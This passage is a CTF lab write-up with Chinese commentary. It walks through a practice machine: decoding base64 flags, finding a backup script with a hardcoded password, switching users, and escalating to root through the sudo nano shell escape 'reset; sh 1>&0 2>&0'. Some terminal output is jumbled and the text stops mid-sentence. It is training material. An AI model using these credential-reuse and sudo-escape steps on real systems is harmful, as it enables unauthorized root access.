1wtf@wtf:~$ ls 2Desktop Documents Downloads Music Pictures Public 3wtf@wtf:~$ cd Downloads 4wtf@wtf:~/Downloads$ ls 5flag-1.txt 6wtf@wtf:~/Downloads$ cat flag-1.txt 7VGhlIGZsYWcgaXMgdGhlIGVuY29kZWQgc3RyaW5nIGl0c2VsZg进行解码
1wtf@wtf:~/Downloads$ echo "VGhlIGZsYWcgaXMgdGhlIGVuY29kZWQgc3RyaW5nIGl0c2VsZg" | base64 -d 2The flag is the encoded string itselfbase64: invalid input接着检查/Documents文件夹
1wtf@wtf:~$ cd ~/Documents 2wtf@wtf:~/Documents$ ls 3backup.sh 4wtf@wtf:~/Documents$ cat backup.sh 5REMOTE=1.2.3.4 6SOURCE=/home/rooot 7TARGET=/usr/local/backup 8LOG=/home/rooot/bck.log 9DATE=`date +%y\.%m\.%d\.` 10USER=n00b 11#aw3s0m3p@$$w0rd 12 13ssh $USER@$REMOTE mkdir $TARGET/$DATE 14 15if [ -d "$SOURCE" ]; then 16 for i in `ls $SOURCE | grep 'data'`;do 17 echo "Begining copy of" $i >> $LOG 18 scp $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE 19 echo $i "completed" >> $LOG 20 21 if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then 22 rm $SOURCE/$i 23 echo $i "removed" >> $LOG 24 echo "####################" >> $LOG 25 else 26 echo "Copy not complete" >> $LOG 27 exit 0 28 fi 29 done 30else 31 echo "Directory is not present" >> $LOG 32 exit 0 33fi发现有用户名n00b，密码aw3s0m3p@$$w0rd
切换为n00b用户
1wtf@wtf:~/Documents$ su n00b 2Password: 3 _________________________________________ 4/ You will be recognized and honored as a \ 5\ community leader. / 6 ----------------------------------------- 7 \ 8 \ 9 .--. 10 |o_o | 11 |:_/ | 12 // \ \ 13 (| | ) 14 /'\_ _/`\ 15 \___)=(___/三、提权#1n00b@wtf:~$ pwd 2/var/www/rooot 3n00b@wtf:~$ sudo -l 4Matching Defaults entries for n00b on wtf: 5 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 6 7User n00b may run the following commands on wtf: 8 (root) NOPASSWD: /bin/nano发现可以用nano编辑器，nano编辑器允许二进制文件以超级用户身份运行sudo，它不会放弃提升的权限
sudo nano ctrl+r，ctrl+x 输入 reset; sh 1>&0 2>&0并回车 界面会变得混乱，这是因为在nano这个应用程序内部强行开启一个shell whoami cd /root cat root.txt 1Command to execute: reset; sh 1>&0 2>&0# whoami 2rootet Help ^X Read File 3# lsancel M-F New Buffer 4# cd /root 5# ls 6root.txt snap 7# cat root.txt 8RW5kb3JzZSBtZSBvbiBsaW5rZWRpbiA9PiBodHRwczovL3d3dy5saW5rZWRpbi5jb20vaW4vZGVlcGFrLWFoZWVyCg== 9 10Follow me on Twitter https://www.twitter.com/Deepakhr9 11 12TryHackMe --> https://www.tryhackme.com/p/Malwre99 13Github --> https://www.github.com/Deepak-Aheer 14(the flag is my LinkedIn username) 15 16 17 THANK YOU for PLAYING THIS CTF 18 19 But REMEMBER we're still N00bs ;) 20# 最终解码 echo "RW5kb3JzZSBtZSBvbiBsaW5rZWRpbiA9PiBodHRwczovL3d3dy5saW5rZWRpbi5jb20vaW4vZGVlcGFrLWFoZWVyCg" | base64 -d 其中-d是解码数据，结果如下
